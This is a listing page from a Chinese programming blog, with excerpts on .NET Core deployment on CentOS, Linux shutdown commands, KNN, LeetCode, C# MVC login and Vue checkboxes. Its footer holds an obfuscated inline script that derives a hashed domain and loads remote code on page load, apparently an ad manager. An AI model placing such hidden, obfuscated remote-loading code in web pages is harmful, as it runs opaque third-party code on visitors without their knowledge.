	<div class="content list__excerpt post__content clearfix">
		直接用dotnet xx.dll命令是可以部署asp.net core项目的，包括https也可实现。但是用jexus有以下几个好处：
1.jexus可以守护dotnet进程
2.同一服务器，同一端口，可以配置多个网站
3.操作简单
4.通过反向代理实现负载均衡（不过jexus一般通过端口转发方式实现asp.net core）
5.检测攻击(只是asp.net+mono方式，不适用asp.net core）
用 .net core 2.0作为目标框架做了一个网站，想部署到centos 6.5上，安装.net core时因为缺少openssl-lib而失败，而安装Openssl-lib又要安装一大堆依赖，最后不得不直接在阿里云后台重新更换到centos 7.4
一.安装.net sdk
sudo rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm sudo yum update sudo yum install libunwind libicu sudo yum install dotnet-sdk-2.1.200 //如果希望安装2.1的最新版，可把后面的.200小版本号去掉 //如果是.net core 3.1版本，就是 sudo yum install dotnet-sdk-3.1 如果后来需要卸载：sudo yum remove dotnet-sdk-2.1.200 安装后运行 dotnet --version 可以查看版本号，就说明成功了 （ 2.1.3以后对应目标框架.net core 2.1, 2.1.200还是属于.net core 2.0 ） (截止目前，最新版本是2.1.504)
二.发布并运行.net core 项目
假设我的站点名称是mysite,创建一个 var/www/mysite 文件夹
在windows上的vs 2017中 publish .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e80c5ae85186dfdb1112b7dc0133fbe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c6b52c01eb628c51fcbb28dce072cd2/" rel="bookmark">
			SWUST OJ#517 作业调度方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
题目
思路
对题目的理解
具体代码讲解
代码
题目 题目描述
我们现在要利用m台机器加工n个工件，每个工件都有m道工序，每道工序都在不同的指定的机器上完成。每个工件的每道工序都有指定的加工时间。
每个工件的每个工序称为一个操作，我们用记号j-k表示一个操作，其中j为1到n中的某个数字，为工件号；k为1到m中的某个数字，为工序号，例如2-4表示第2个工件第4道工序的这个操作。在本题中，我们还给定对于各操作的一个安排顺序。
例如，当n=3，m=2时，“1-1，1-2，2-1，3-1，3-2，2-2”就是一个给定的安排顺序，即先安排第1个工件的第1个工序，再安排第1个工件的第2个工序，然后再安排第2个工件的第1个工序，等等。
一方面，每个操作的安排都要满足以下的两个约束条件。
(1) 对同一个工件，每道工序必须在它前面的工序完成后才能开始；
(2) 同一时刻每一台机器至多只能加工一个工件。
另一方面，在安排后面的操作时，不能改动前面已安排的操作的工作状态。
由于同一工件都是按工序的顺序安排的，因此，只按原顺序给出工件号，仍可得到同样的安排顺序，于是，在输入数据中，我们将这个安排顺序简写为“1 1 2 3 3 2”。
还要注意，“安排顺序”只要求按照给定的顺序安排每个操作。不一定是各机器上的实际操作顺序。在具体实施时，有可能排在后面的某个操作比前面的某个操作先完成。
例如，取n=3,m=2，已知数据如下（机器号/加工时间）：
则对于安排顺序“1 1 2 3 3 2”，下图中的两个实施方案都是正确的。
但所需要的总时间分别是10与12。 当一个操作插入到某台机器的某个空档时（机器上最后的尚未安排操作的部分也可以看作一个空档），可以靠前插入，也可以靠后或居中插入。
为了使问题简单一些，我们约定：在保证约束条件（1）（2）的条件下，尽量靠前插入。并且，我们还约定，如果有多个空档可以插入，就在保证约束条件（1）（2）的条件下，插入到最前面的一个空档。
于是，在这些约定下，上例中的方案一是正确的，而方案二是不正确的。
显然，在这些约定下，对于给定的安排顺序，符合该安排顺序的实施方案是唯一的，请你计算出该方案完成全部任务所需的总时间。
输入
第1行为两个正整数m和n（其中m（&lt;20）表示机器数，n（&lt;20）表示工件数），用一个空格隔开： 第2行：个用空格隔开的数，为给定的安排顺序。 接下来的2n行，每行都是用空格隔开的m个正整数，每个数不超过20。 其中前n行依次表示每个工件的每个工序所使用的机器号，第1个数为第1个工序的机器号，第2个数为第2个工序机器号，等等。 后n行依次表示每个工件的每个工序的加工时间。
输出
只有一个正整数，为最少的加工时间。
样例输入
2 3 1 1 2 3 3 2 1 2 1 2 2 1 3 2 2 5 2 4 样例输出
10 思路 对题目的理解 相信很多人看到这个题的状态就是：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c6b52c01eb628c51fcbb28dce072cd2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c60c0d6e198f0a3b24da778cde835e92/" rel="bookmark">
			第五章：开机，重启和用户登录注销-[实操篇]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：开机&amp;重启命令 1.1基本介绍 shutdown
shutdown -h now：表示立即关机
shutdown -h 1 : 表示1分钟后关机
shutdown -r now : 立即重启
halt
就是直接使用，效果等价于关机
reboot
就是直接使用，效果等价于关机
syn ：把内存的数据同步到磁盘
1.2注意细节 当我们关机或者重启时，都应该先执行以下 sync 指令，把内存的数据写入磁盘，防止数据丢失。
二：用户登录和注销 2.1基本介绍 1&gt;登录时尽量少用 root 账号登录，因为它是系统管理员，最大的权限，避免操作失误。可以利用普通用户登录，登录后再用“ su - 用户名 ‘ 命令来切换成系统管理员身份。
2&gt;在提示符下输入 logout 即可注销用户
2.2使用细节 1&gt;logout 注销指令在图形运行级别无效，在运行级别 3 下有效。
2&gt;运行级别这个概念，后面再说
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37ba3c7792516175bab9dc14928fce63/" rel="bookmark">
			分类算法KNN的python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：刘凡
KNN算法介绍 KNN算法是有监督学习中的分类算法，它是一种非参的，惰性的算法模型。非参的意思并不是说这个算法不需要参数，而是意味着这个模型不会对数据做出任何的假设，与之相对的是线性回归（我们总会假设线性回归是一条直线）。也就是说KNN建立的模型结构是根据数据来决定的，这也比较符合现实的情况，毕竟在现实中的情况往往与理论上的假设是不相符的。惰性的意思是指模型在使用前不会被训练，只有当使用的时候才会被训练。
KNN算法优点： 简单易用，相比其他算法，KNN算是比较简洁明了的算法。即使没有很高的数学基础也能搞清楚它的原理。可以处理多分类问题；还可以处理回归问题。
KNN算法缺点： 对内存要求较高，因为该算法存储了所有训练数据，预测阶段可能很慢；对训练数据依赖度特别大，虽然所有机器学习的算法对数据的依赖度很高，但是KNN尤其严重，因为如果我们的训练数据集中，有一两个数据是错误的，刚刚好又在我们需要分类的数值的旁边，这样就会直接导致预测的数据的不准确，对训练数据的容错性太差；维数灾难。
自编函数实现 #欧氏距离 def distance(a,b): return np.sqrt(np.sum((a-b)**2,axis=1)) # 分类器实现 class kNN(object): # 定义初始化方法,初始化kNN需要的参数 def __init__(self,n_neighbors = 1,dist_func = distance): self.n_neighbors = n_neighbors self.dist_func = dist_func # 训练模型方法 def fit(self,x,y): # 将x，y传进来即可 self.x = x self.y = y # 模型预测方法 def predict(self,x): # 初始化预测分类数组 y_pred = np.zeros((x.shape[0],1),dtype = self.y.dtype) # 遍历输入的x数据点，取出每一个数据点的i和数据x_test for i,x_test in enumerate(x): # x_test跟所有的训练数据计算距离 distances = self.dist_func(self.x,x_test) # 得到的距离按照由近到远排序 nn_index = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37ba3c7792516175bab9dc14928fce63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd0868e479c7d5a35b0166bb2a9e7bd9/" rel="bookmark">
			LeetCode-题目详解：链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2-两数相加 给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。
请你将两个数相加，并以相同形式返回一个表示和的链表。
你可以假设除了数字 0 之外，这两个数都不会以 0 开头。
示例 1：
输入：l1 = [2,4,3], l2 = [5,6,4] 输出：[7,0,8] 解释：342 + 465 = 807. 示例 2：
输入：l1 = [0], l2 = [0] 输出：[0] 示例 3：
输入：l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9] 输出：[8,9,9,9,0,0,0,1] 提示：
每个链表中的节点数在范围 [1, 100] 内0 &lt;= Node.val &lt;= 9题目数据保证列表表示的数字不含前导零 # Definition for singly-linked list. # class ListNode: # def __init__(self, val=0, next=None): # self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd0868e479c7d5a35b0166bb2a9e7bd9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5f42eeae1217a21440dd7468623af68/" rel="bookmark">
			C# .Net MVC框架实现最简单的登陆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 前言C#.net实现最简单登陆 一、C#,.net是什么，相比较于C++,java二、C# .net创建一个MVC框架工程1.步骤 实现结果 前言 C#.net实现最简单登陆 提示：以下是本篇文章正文内容，下面案例可供参考
一、C#,.net是什么，相比较于C++,java C#是一门面向对象语言，相比较于C++不只有封装继承多态，而且多了垃圾回收机制，新特性。
.net是一门技术，类似于java中的springboot技术，我们使用.net能够更方面的我们去web编程，包括配置。
C#与java是同一级别高级语言，因为开发者不一样，导致标准规则会有所不同，但是两者开发web是同样简单方便。
二、C# .net创建一个MVC框架工程 1.步骤 vs2022工具
新建MVC工程
最后一步创建完毕
创建会在资源解决方案生成如图：
## 2.运行项目 ![在这里插入图片描述](https://img-blog.csdnimg.cn/7c27e083f44043c48f6df0727f3ead46.png) ## 3.新建DemoController 右键controller文件夹新建添加控制器，命令DemoController就行 如图 ![在这里插入图片描述](https://img-blog.csdnimg.cn/94ca92e409ac48c4b3e3f338679e5bcc.png) 内容代码 ```csharp using Microsoft.AspNetCore.Mvc; namespace WebApplication6.Controllers { public class DemoController : Controller { public IActionResult Index() { return View(); } public ActionResult Login() { return View(); } /// &lt;summary&gt; /// 登录post /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; [HttpPost] public ActionResult Login(String username,String password) { //SqlDBHelper sqlDB = new SqlDBHelper(); //得到从数据库中查询到的表对象 // DataTable adminDT = sqlDB.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5f42eeae1217a21440dd7468623af68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2455a944d810043dfa3486b28586593a/" rel="bookmark">
			【vue例子】利用vue实现单选框或者多选框
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;单选、多选、全选&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt; &lt;!-- 这是全选复选框（即选中了这个复选框，所有选项复选框都被选中），其绑定数据的v-model为checkedAll，并绑定了改变事件changeAllChecked --&gt; &lt;input type="checkbox" v-model="checkedAll" @change="changeAllChecked()" /&gt; &lt;/th&gt; &lt;th&gt;全选&lt;/th&gt; &lt;/tr&gt; &lt;tr v-for="item in checkedAttr"&gt; &lt;td&gt;&lt;input type="checkbox" :value="item" v-model="checkedItem" /&gt;&lt;/td&gt; &lt;td&gt;{{item}}&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;!-- 这里需要引入自己的vue.js文件 --&gt; &lt;script src="js/vue.js"&gt;&lt;/script&gt; &lt;script&gt; var app = new Vue({ el: "#app", //js data() { return { checkedAll: false, // 设置选项复选框初始状态为未选中,由于是一个数组,所以值为[],即为空 checkedItem: [], // 设置选中全选复选框后重新给选项复选框赋值,即选中所有的选项复选框 checkedAttr: ["
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2455a944d810043dfa3486b28586593a/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/194/">«</a>
	<span class="pagination__item pagination__item--current">195/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/196/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>